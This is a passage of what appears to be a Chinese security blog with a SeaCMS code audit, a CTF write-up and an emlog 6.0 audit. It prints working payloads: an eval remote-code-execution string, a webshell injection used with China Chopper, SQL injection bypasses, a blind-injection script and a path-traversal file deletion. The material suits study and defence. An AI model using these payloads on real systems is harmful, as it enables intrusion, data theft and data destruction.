对键值进行了转义处理 漏洞分析下面来到关键的存在漏洞的search.php下，在开头还看到了一处过滤点 123456#search.php 第6-10行foreach($_GET as $k=&gt;$v)&#123; $$k=_RunMagicQuotes(gbutf8(RemoveXSS($v))); $schwhere.= \"&amp;$k=\".urlencode($$k);&#125; RemoveXSS函数是ThinkPHP框架中用来预防XSS攻击的过滤函数，并经过_RunMagicQuotes的转义处理 1234567#search.php 第54-58行if($searchword==''&amp;&amp;$searchtype!=5)&#123; ShowMsg('关键字不能为空！','index.php','0',$cfg_search_time*1000); exit();&#125;echoSearchPage(); 在执行漏洞函数echoSearchPage之前，必须满足$earchtype==5的条件 命令执行漏洞存在于函数echoSearchPage： 12345678910111213function echoSearchPage()&#123; ... $order = !empty($order)?$order:time; ... $content = str_replace(\"&#123;searchpage:page&#125;\",$page,$content); $content = str_replace(\"&#123;seacms:searchword&#125;\",$searchword,$content); $content = str_replace(\"&#123;seacms:searchnum&#125;\",$TotalResult,$content); $content = str_replace(\"&#123;searchpage:ordername&#125;\",$order,$content); ... $content=$mainClassObj-&gt;parseIf($content); ...&#125; 以上代码是该函数漏洞存在的关键语句，至于为什么存在漏洞，我们继续跟踪函数parseIf就能明白 1234567891011121314151617181920#/include/main.class.php 第3098行function parseIf($content)&#123; if (strpos($content,'&#123;if:')=== false)&#123; return $content; &#125;else&#123; $labelRule = buildregx(\"&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;\",\"is\"); $labelRule2=\"&#123;elseif\"; $labelRule3=\"&#123;else&#125;\"; preg_match_all($labelRule,$content,$iar); $arlen=count($iar[0]); ... for($m=0;$m&lt;$arlen;$m++)&#123; $strIf=$iar[1][$m]; $strIf=$this-&gt;parseStrIf($strIf); $strThen=$iar[2][$m]; $strThen=$this-&gt;parseSubIf($strThen); if (strpos($strThen,$labelRule2)===false)&#123; ... @eval(\"if(\".$strIf.\") &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;\");... 上述关键性代码中，很简单明了看出了最终漏洞存在语句@eval(&quot;if(&quot;.$strIf.&quot;) { \\$ifFlag=true;} else{ \\$ifFlag=false;}&quot;)，知道了漏洞存在点，我们就一步步的追溯回去。 首先跟踪变量$strIf，在$strIf=$iar[1][$m];语句中对其进行赋值，变量$iar[1]又是什么，我们继续跟踪，在语句preg_match_all($labelRule,$content,$iar);中，通过正则匹配函数preg_match_all将匹配结果赋值给了数组变量$iar，函数中的第二个参数，即匹配的字符串，即为传入的变量$content，第一个参数，即匹配规则变量$labelRule = buildregx(&quot;{if:(.*?)}(.*?){end if}&quot;,&quot;is&quot;)，bulidregx函数作用是创建正则匹配规则表达式，则最后匹配规则为/{if:(.*?)}(.*?){end if}/is，匹配结果$iar数组[0]为所有匹配结果，[1]为匹配规则中第一个括号中内容匹配结果，[2]为匹配规则中第二个括号中内容匹配结果。另外(.*?)代表贪婪匹配。所以，匹配字符串一定要包含的内容有{if:}{end if}，不包含{else if，那么匹配到的第一个括号内容，即$iar[1]内容就会被传入eval函数中执行 现在理清一下思路，目前已知，命令执行的条件是我们传入的参数$content必须符合正则匹配内容，并且将第一个括号里的内容作为命令执行，我们这里可以先思考一下，传入什么内容进行getshell，就目前而已，传入$content带有{if:1)phpinfo();if(1}{end if}，拼接到eval函数中为@eval(&quot;if(1)phpinfo();if(1) { \\$ifFlag=true;} else{ \\$ifFlag=false;}&quot;);，即可getshell 所以，我们接下来回到search.php文件的函数下echoSearchPage，跟踪$content变量即可，其实从上面的关键代码，我们就可以猜到，$content实际上就是一个网站模板，内容来自于/data/cache下面，然后再通过str_replace函数对模板内容进行替换，在echoSearchPage函数的开头，我们就发现变量$order = !empty($order)?$order:time;而该变量可以通过POST和GET的方式获取到，如果是GET，则又XSS过滤和转义处理，如果是POST，则只有转义处理。之后，通过语句$content = str_replace(&quot;{searchpage:ordername}&quot;,$order,$content);对模板中的{searchpage:ordername}进行了替换 以下取自模板文件中的代码 那么，如果我们传入参数order为上面的getshell内容即order={if:1)phpinfo();if(1}{end if}，那么替换到模板中，即$content包含的内容{if:&quot;{if:1)phpinfo();if(1}{end if}&quot;==&quot;time&quot;}，那么，传入parseIf函数，经过正则匹配的内容，就为$iar[0][m]={if:&quot;{if:1)phpinfo();if(1}{end if}，$iar[1][m]=&quot;{if:1)phpinfo();if(1，最后拼接到eval函数中为@eval(&quot;if({if:1)phpinfo();if(1) { \\$ifFlag=true;} else{ \\$ifFlag=false;}&quot;);，很明显会导致执行失败，因为原来的模板中还包含了个{if: 我们可以通过在源代码中加入测试语句即可发现： 所以我们还要想办法，闭合前面的{if:，最终payload如下： 1POST:searchtype=5&amp;order=&#125;&#123;end if&#125;&#123;if:1)phpinfo();if(1&#125;&#123;end if&#125; 最终执行结果： 漏洞成因纠其漏洞根本，还是对用户输入参数未过滤完全，为什么这里选择参数$order，一开始我也有这个疑问，这里明明不止替换这一个模板参数，但是经过尝试其他参数如$area,$year等，发现都无法执行，这时我们来到文件开头部分 1234567891011121314$searchword = RemoveXSS(stripslashes($searchword));$searchword = addslashes(cn_substr($searchword,20));$searchword = trim($searchword);$jq = RemoveXSS(stripslashes($jq));$jq = addslashes(cn_substr($jq,20));$area = RemoveXSS(stripslashes($area));$area = addslashes(cn_substr($area,20));$year = RemoveXSS(stripslashes($year));$year = addslashes(cn_substr($year,20));... 可以发现，这些参数都经过RemoveXSS的过滤，而我们payload中的参数order，我们可以全局搜索一下，除了转义以外，未做任何过滤处理，所以最简单的修复该漏洞方法，我觉得应该就是添加上对参数order的RemoveXSS函数过滤 参考链接最后附上参考文章：https://bbs.ichunqiu.com/thread-35085-1-1.html","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/categories/代码审计/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/tags/代码审计/"}]},{"title":"上海\"嘉伟思杯\"ctf","slug":"上海“嘉韦思杯”ctf","date":"2019-03-31T07:15:00.000Z","updated":"2019-03-31T07:26:48.562Z","comments":true,"path":"/posts/45634/","link":"","permalink":"https://Foxgrin.github.io/posts/45634/","excerpt":"上海ctf WriteUp","text":"上海ctf WriteUp Web土肥原贤二题目链接：http://47.103.43.235:81/quest/web/a/index.php SQL注入题，没有过滤特殊字符，gid通过单引号包裹，采用联合查询注入 payload：?gid=0&#39;%20union%20select%201,(select%20flag%20from%20flag),3,4%23 flag:flag{20_welcome_19} 吴佩孚题目链接：http://47.103.43.235:85/b/%E7%AC%AC%E4%B8%80%E9%A2%98_js%EF%BC%9F.txt 给了一串字符，经过base64解密后，得到一串jsfuck代码，经过网站https://www.bugku.com/tools/jsfuck/解密后得到flag flag:flag{sdf465454dfgert32} 戴星炳题目链接：http://47.103.43.235:82/web/a/index.php 题目意思是计算一串公式，但是每次刷新页面公式内容都会变化，所以要通过python的Session机制提交计算结果，脚本代码如下： 123456789101112131415import requests,refrom bs4 import BeautifulSoups = requests.Session()url = \"http://47.103.43.235:82/web/a/index.php\"r = s.get(url)soup = BeautifulSoup(r.text,'lxml')a = re.findall('&lt;p&gt;(.*)&lt;/p&gt;',str(soup.find_all('p')[1]))[0]result = eval(a)data = &#123; 'result':result &#125;r1 = s.post(url,data=data)print(r1.text) flag:flag{Y0U_4R3_3o_F4ST!} 晴气庆胤题目链接：http://47.103.43.235:85/a/ 源代码给出了提示：if ((string)$_POST[&#39;paraml&#39;]!==(string)$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;paraml&#39;])===md5($_POST[&#39;param2&#39;])) 要提交两个md5值完全相等的参数，参考链接https://xz.aliyun.com/t/2232 通过链接中的fastcoll_v1.0.0.5.exe文件，使用命令fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt 生成1.txt和2.txt两个文件 再通过以下代码： 12345678910111213141516171819&lt;?php function readmyfile($path)&#123; $fh = fopen($path, \"rb\"); $data = fread($fh, filesize($path)); fclose($fh); return $data;&#125;echo '二进制hash '. md5( (readmyfile(\"1.txt\")));echo \"&lt;br&gt;&lt;br&gt;\\r\\n\";echo 'URLENCODE '. urlencode(readmyfile(\"1.txt\"));echo \"&lt;br&gt;&lt;br&gt;\\r\\n\";echo 'URLENCODE hash '.md5(urlencode (readmyfile(\"1.txt\")));echo \"&lt;br&gt;&lt;br&gt;\\r\\n\";echo '二进制hash '.md5( (readmyfile(\"2.txt\")));echo \"&lt;br&gt;&lt;br&gt;\\r\\n\";echo 'URLENCODE '. urlencode(readmyfile(\"2.txt\"));echo \"&lt;br&gt;&lt;br&gt;\\r\\n\";echo 'URLENCODE hash '.md5( urlencode(readmyfile(\"2.txt\")));echo \"&lt;br&gt;&lt;br&gt;\\r\\n\"; 生成两个hash一样，但是实际内容不一样的字符串 将这两串字符分别提交，获得flag，payload： 1param1=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyrer%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EF%F5%7C9%D5K%BAK%C6%C7N%3Be%93%F8P%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BCz%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8%E4%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9E%F4%EFzG%9B&amp;param2=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyr%E5r%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EFu%7D9%D5K%BAK%C6%C7N%3Be%93%F8%D0%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BC%FA%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8d%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9Et%EFzG%9B flag:flag{MD5@_@success} 冈村宁次题目链接：http://47.103.43.235:83/web/a/index.php?id===QM 查询结果的id字段为1，而1的base64加密结果为MQ==，说明id参数的值经过base64解密后再反转再添加到SQL语句中，在py命令行中使用base64.b64encode(&#39;&#39;)[::-1]进行base64加密再反转效果 经过测试，这题对sleep,extractvalue,updatexml函数进行了检查，检查到再最前面添加1，所以无法使用报错和延时注入 另外过滤了or,select,union,空格,逗号，等号，绕过方法分别为：（1）双写or，select，union（2）用/**/代替空格（3）用select()a join select ()b代替逗号（4）用like，regexp代替等号 爆数据库payload： 1base64.b64encode('0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/6)f)')[::-1] 数据库名：ctf_sql 爆表名payload： 1base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/database())f)&quot;)[::-1] 表名：book,flag 爆列名payload： 1base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/0x666c6167)f)&quot;)[::-1] 列名：flag 爆flag payload： 1base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/flag/**/from/**/flag)f)&quot;)[::-1] flag：flag{s9li_1s_s0_e4sY} 作战计划题目链接：http://47.103.43.235:84 海洋cms，之前就爆出的search.php存在命令执行漏洞，payload： 1http://47.103.43.235:84/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1]) 通过菜刀连接后，在根目录下找到flag.txt，获得flag flag：flag{!!seacms_@@} 池步洲题目链接：http://47.103.43.235:82/web/b/index.php 源代码给出提示文件index.phps，访问后下载获得源代码： 1234567891011&lt;?phperror_reporting(0);$flag = '********';if (isset($_POST['name']) and isset($_POST['password']))&#123; if ($_POST['name'] == $_POST['password']) print 'name and password must be diffirent'; else if (sha1($_POST['name']) === sha1($_POST['password'])) die($flag); else print 'invalid password';&#125;?&gt; sha1函数无法处理数组，通过传入两个数组即可绕过过滤，payload：name[]=1&amp;password[]=2 flag：flag{Y0u_just_br0ke_sha1} 密码学日军空袭题目链接：http://47.103.43.235:82/crypto/a/index.php 页面给了一串看似base64加密后的字符串，经过一次base64解密发现末尾出现了$3D说明可能还存在URL编码，所以需要URL和base64循环解码，脚本代码如下： 12345678910111213from base64 import b64decodefrom urllib import unquotes = 'Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1NHVkVRbUZXVmxsM1ZqQmFTMlJIVmtkWGJGcHBWa1phZVZadGVGWmxSbGw1Vkd0c2FsSnRhRzlVVm1oRFZWWmFkR05GZEZSTlZXdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbXRXTVhCRlZXeHdWMDFFUlRCV2Fra3hVakZhV0ZOcmFGWmlhMHBYV1d4b1UwMHhWWGhYYlhSWFRWWndNRlZ0ZUZOVWJVWTJVbFJDVjJFeVRYaFdSRVpyVTBaT2NscEhjRk5XUjNob1YxZDRiMVV4VWtkWGJrNVlZbGhTV0ZSV1pEQk9iR3hXVjJ4T1ZXSkdjRlpXYlhoelZqRmFObEZZYUZkU1JYQklWbXBHVDFkV2NFZGhSMnhUWVROQ1dsWXhXbXROUjFGNVZXNU9hbEp0VWxsWmJGWmhZMnhXY1ZKdFJsUlNiR3cxVkZaU1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKWVFrbFdiWEJIVkRGa1YyTkZaR2hTTW5oVVdWUk9RMWRzV1hoWGJYUk9VbTE0V0ZaWGRHdFdNV1JJWVVac1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5TUmxweFUydGFiRlpzU2xwWlZWcHJZVWRGZWxGcmJGZGlXRUpJVmtSS1UxWXhXblZWYldoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxkSFVsWlVWbHBIVFRGU2MxWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreU1VZFNiRkp6Vkcxc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQnhWV3hrVTFsV1VsWlhiVVpyWWtad2VGVnRkREJWTWtwSVZXcENXbFpXY0hKWlZXUkdaVWRPU0U5V2FHaE5WbkJ2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTVc5bGJHUllaVWM1YVUxWFVucFdNV2h2VjBkS1dWVnJPVlppVkVVd1ZqQmFZVmRIVWtoa1JtUnBWbGhDU2xkV1ZtOVVNVnAwVW01S1QxWnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYVFc1b1dGbFVRWGhUUmtweVdrWm9hV0Y2Vm5oV1ZFSnZVVEZzVjFWc1dsaGlWVnB6V1d0YWQyVkdWWGxrUjNSb1lsVndWMWx1Y0V0V2JGbDZZVVJPV21FeVVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFhZbXhhVjFsc2FFTldSbXhaWTBaa2EwMVdjREJaTUZZd1lWVXhXRlZyYUZkTmFsWlVWa2Q0UzFKc1pIVlRiRlpYWWtoQ05sWkhlR0ZaVm1SR1RsWmFVRlp0YUZSWmJGcExVMnhhYzFwRVVtcE5WMUl3VlRKMGIyRkdTbk5UYlVaVlZteHdNMVpyV21GalZrcDFXa1pPVGxacmIzZFhiRlpyWXpGVmVWTnNiRnBOTW1oWVZGWmFTMVZHY0VWU2EzQnNVbTFTV2xkclZURldNVnB6WTBaV1dGWXpVbkpXVkVaelZqRldjMWRzYUdsV1ZuQlFWa1phWVdReVZrZFdibEpzVTBkU2NGVnFRbmRXTVZsNVpFaGtWMDFFUmpGWlZWSlBWMjFGZVZWclpHRldNMmhJV1RKemVGWXhjRWRhUlRWT1VsaENTMVp0TVRCVk1VMTRWVzVTVjJFeVVtaFZNRnBoVmpGc2MxcEVVbGRTYlhoYVdUQmFhMWRHV25OalJteGFUVVpWTVZsV1ZYaFhSbFp6WVVaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlXV3RvUTFkV1draGtSMFpvVFdzMWVsWXlOVk5oTVVsNVlVWm9XbFpGTlVSVk1WcHJWbFpHZEZKc1drNVdNVWwzVmxkNGIySXhXWGhhUldob1VtMW9WbFpzV25kTk1XeFdWMjVrVTJKSVFraFdSM2hUVlRKRmVsRllaRmhpUmxweVdYcEdWbVZXVG5KYVIyaE9UVzFvV1ZaR1l6RlZNV1JIVjJ4V1UyRXhjSE5WYlRGVFYyeGtjbFpVUmxkTmEzQktWVmMxYjFZeFdqWlNWRUpoVWtWYWNsVnFTa3RUVmxKMFlVWk9hR1ZzV2pSV2JUQjRaV3N4V0ZadVRsaGlSMmh4V2xkNFlWWXhVbGRYYlVaWFZteHdlbGxWYUd0V2F6RldWbXBTVjJKWVFtaFdiVEZHWkRGYWRWUnNWbGRTVlhCVVYxZDBWbVF5VVhoV2JGSlhWMGhDVkZWV1RsWmxiRXBFVmxod1UxRlRWWHBTUTFWNlVrRWxNMFFsTTBRJTNE'while True: while '%' in s: s = unquote(s) try: s = b64decode(s) except: breakprint s 得到s = fB__l621a4h4g_ai{&amp;i}，每五位凑成flag的一个字符，最后得到flag：flag{B64_&amp;_2hai_14i} 潘汉年题目给出字符串和提示flag格式，观察字符串和flag的ascii编码，发现从4开始逐位在原来基础上+1 12345s = \"bg[`sZ*Zg'dPfP`VM_SXVd\"f = \"flag\"for i in range(4): print ord(f[i]) - ord(s[i]) 结果得到4,5,6,7，验证了想法 据此对密文进行还原： 123456789s = \"bg[`sZ*Zg'dPfP`VM_SXVd\"flag = \"\"offset = 4for i in range(len(s)): flag = flag + chr(ord(s[i]) + offset) offset = offset + 1print flag 得到flag：flag{c4es4r_variation} 袁殊RSA 摸熟 n 过小，导致可被分解的问题，先用 openssl 提取公钥中的 e 和 n 1234567891011121314openssl rsa -pubin -text -modulus -in warmup -in gy.keyPublic-Key: (256 bit)Modulus: 00:a9:bd:4c:7a:77:63:37:0a:04:2f:e6:be:c7:dd: c8:41:60:2d:b9:42:c7:a3:62:d1:b5:d3:72:a4:d0: 89:12:d9Exponent: 65537 (0x10001)Modulus=A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9writing RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKm9THp3YzcKBC/mvsfdyEFgLblCx6Ni0bXTcqTQiRLZAgMBAAE=-----END PUBLIC KEY----- 在 factordb.com 分解 n 得到素因子 p 和 q， 解得私钥 d，再解得明文 m 1234567891011121314151617from Crypto.Util.number import *e = 65537n = 0xA9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9p = 273821108020968288372911424519201044333q = 280385007186315115828483000867559983517phi = (p - 1) * (q - 1)assert GCD(e, phi) == 1d = inverse(e, phi)c = open('E:\\\\Downloads\\\\CTF\\\\RSA256\\\\fllllllag.txt', 'rb').read()c = bytes_to_long(c)m = pow(c, d, n)print long_to_bytes(m)# flag&#123;_2o!9_CTF_ECUN_&#125; 杂项死亡真相题目链接：https://47.103.43.235:85/d/奇怪的单点音.wav 在空缺处补0，再进行md5解密得到flag:flag{hsd132456} 大美晚报题目链接：http://47.103.43.235:82/web/c/ 题目给了一个二维码，保存图片后foremost，得到一个压缩包，提示说是管理员QQ号，直接爆破出号码：674290437 获得flag：flag{d6@YX$_m^aa0}","categories":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"代码审计--emlog6.0","slug":"代码审计-emlog","date":"2019-03-19T12:15:00.000Z","updated":"2019-03-26T12:04:38.899Z","comments":true,"path":"/posts/15210/","link":"","permalink":"https://Foxgrin.github.io/posts/15210/","excerpt":"记录emlog6.0审计过程以及漏洞分析","text":"记录emlog6.0审计过程以及漏洞分析 全局分析分析网站根目录下/index.php包含的头文件/init.php，可以发现，其中对GET,POST等进行处理的只有第二十一行的函数doStripslashes()，跟踪该函数，发现该函数作用居然还是去除转义字符，所以可以说，全局对GET,POST数据实际上是毫无过滤的。所以接下来，我们可以在Seay审计系统下进行全局搜索GET和POST的数据，如果没有其他过滤，那么是非常好利用的。 漏洞分析1.SQL注入/admin/comment.php第46行语句$ip = isset($_GET[&#39;ip&#39;]) ? $_GET[&#39;ip&#39;] : &#39;&#39;;未对参数$_GET[&#39;ip&#39;]进行过滤，在47行中将变量$ip传入函数delCommentByIp()，跟踪该函数，在/include/model/comment_model.php中第152行中将该参数拼接到SQL语句，经由单引号包裹 经过全局分析我们知道实际上$_GET[&#39;ip&#39;]参数是没有任何过滤的，所以我们可以很轻松的进行SQL注入，这里采用的是报错注入 payload如下： 12345678910GET /emlog/admin/comment.php?action=delbyip&amp;ip=127.0.0.1&apos;%20and%20extractvalue(1,concat(0x3a,database(),0x3a))%23&amp;token=2559f394de1177aaf9652f6ea371566d HTTP/1.1Host: 127.0.0.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/emlog/admin/comment.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: em_plugin_new=block; em_link_new=inline-block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1Connection: close 注意这里因为有检查Token机制，所以我们必须在页面上进行抓包 同样在/admin/tag.php第44行语句$tags = isset($_POST[&#39;tag&#39;]) ? $_POST[&#39;tag&#39;] : &#39;&#39;;未对变量$_POST[&#39;tag&#39;]进行过滤，在53行中将变量$tags的键值传入函数deleteTag()，跟踪函数，在/include/model/tag_model.php中将该变量拼接到DELETE语句中 因为是DELETE语句，所以这里采用延时注入，同时需要注意因为我们不能保证$tagId一定存在于表中，而且即便存在，执行完一次也会被删除，所以这里采用or连接，保证后面的延时注入语句能执行，payload如下： 12345678910111213141516POST /emlog/admin/tag.php?action=dell_all_tag HTTP/1.1Host: 127.0.0.1Content-Length: 101Cache-Control: max-age=0Origin: http://127.0.0.1Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/emlog/admin/tag.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: em_plugin_new=block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1Connection: closetag[0 or if(ascii(substr(database(),0,1))%3d101,0,sleep(3))]=1&amp;token=2559f394de1177aaf9652f6ea371566d 之后就是写脚本注入，但是这里同样采用了验证TOKEN机制，而且我们必须登录后台才能进行该项操作，所以需要采用python的Session机制进行登录并抓取页面TOKEN值，代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import requestsimport timefrom bs4 import BeautifulSoupdef login(s,login_url,user,pw): login_data = &#123; 'user':user, 'pw':pw &#125; r = s.post(url=login_url,data=login_data)def get_token(s,token_url): r = s.get(token_url) soup = BeautifulSoup(r.text,'lxml') token = soup.find_all('input',attrs=&#123;'name':'token'&#125;)[0]['value'] return tokendef get_database(s,url,token): database = \"\" flag = 0 for i in range(1,20): for j in range(95,123): data = &#123; 'tag[0 or if(ascii(substr(database(),%d,1))=%d,sleep(3),0)]'%(i,j):'1', 'token':token &#125; start = time.perf_counter() s.post(url,data=data) end = time.perf_counter() t = end - start if t &gt;= 3: database = database + chr(j) flag = 1 break if j == 122 and flag == 0: break flag = 0 print(\"database:\",database)if __name__ == '__main__': s = requests.Session() login_url = \"http://127.0.0.1/emlog/admin/index.php?action=login\" login(s,login_url,'admin01','admin01') token_url = \"http://127.0.0.1/emlog/admin/tag.php\" token = get_token(s,token_url) target_url = \"http://127.0.0.1/emlog/admin/tag.php?action=dell_all_tag\" get_database(s,target_url,token) /admin/navbar.php第78行$pages = isset($_POST[&#39;pages&#39;]) ? $_POST[&#39;pages&#39;] : array();存在未过滤变量$pages，在85行将变量$pages的键值作为变量$id传入函数addNavi()中，跟踪该函数，在/include/model/navi_model.php中将该变量拼接到INSERT语句中 INSERT注入我们采用的是select case when 条件 then sleep(3) else 1 end的延时注入，payload如下： 12345678910111213POST /emlog/admin/navbar.php?action=add_page HTTP/1.1Host: 127.0.0.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: em_plugin_new=block; em_link_new=inline-block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 5pages[1%2b(select case when(1%3d1) then sleep(3) else 1 end)]=1 脚本参考上面，这里略 2.任意文件删除漏洞/admin/data.php第143-144行存在未过滤变量$_POST[&#39;bak&#39;]拼接到unlink中，导致任意路径穿越删除文件漏洞 payload： 1234567891011121314POST /emlog/admin/data.php?action=dell_all_bak HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: em_plugin_new=block; em_link_new=inline-block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 21bak[0]=../../hint.php /admin/blogger.php第92行存在危险函数unlink，跟踪变量$icon_1，该变量来自80行中的sql查询字段photo返回结果，跟踪语句31行中变量$photo通过POST传入，有转义处理，并在72行中将photo更新到数据库中，虽然有转义处理，依旧可以造成任意路径穿越删除文件 实现的过程如下：先通过POST将构造的任意路径变量$photo更新到数据库中（$action=update），再通过$action=delicon触发unlink($icon_1)，进行任意文件删除 payload如下： 12345678910111213141516171819POST /emlog/admin/blogger.php?action=update HTTP/1.1Host: 127.0.0.1Content-Length: 979Cache-Control: 